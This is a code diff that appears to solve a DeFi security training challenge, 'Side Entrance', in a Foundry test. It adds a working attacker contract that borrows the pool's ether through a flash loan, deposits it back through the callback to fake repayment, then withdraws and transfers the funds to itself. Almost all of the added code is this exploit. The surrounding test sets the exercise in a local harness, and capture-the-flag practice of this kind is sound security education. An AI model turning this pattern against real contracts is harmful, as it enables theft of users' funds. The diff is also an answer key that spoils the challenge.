@@ -8,6 +8,33 @@ import {Vm} from "forge-std/Vm.sol";
 
 import {SideEntranceLenderPool} from "../../../Contracts/side-entrance/SideEntranceLenderPool.sol";
 
+contract HackContract {
+    SideEntranceLenderPool internal sideEntranceLenderPool;
+    address public owner;
+    uint256 internal constant ETHER_IN_POOL = 1_000e18;
+
+    constructor(SideEntranceLenderPool _sideEntranceLenderPool) {
+        sideEntranceLenderPool = _sideEntranceLenderPool;
+        owner = msg.sender;
+    }
+
+    function execute() external payable {
+        require(msg.sender == address(sideEntranceLenderPool), "Not pool");
+        sideEntranceLenderPool.deposit{value: msg.value}();
+    }
+
+    function attack() public payable {
+        require(msg.sender == owner, "Not Owner");
+        sideEntranceLenderPool.flashLoan(ETHER_IN_POOL);
+
+        sideEntranceLenderPool.withdraw();
+
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
+
 contract SideEntrance is DSTest {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
 
@@ -36,8 +63,12 @@ contract SideEntrance is DSTest {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testSideEntranceExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        HackContract hackContract = new HackContract(sideEntranceLenderPool);
+        hackContract.attack();
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
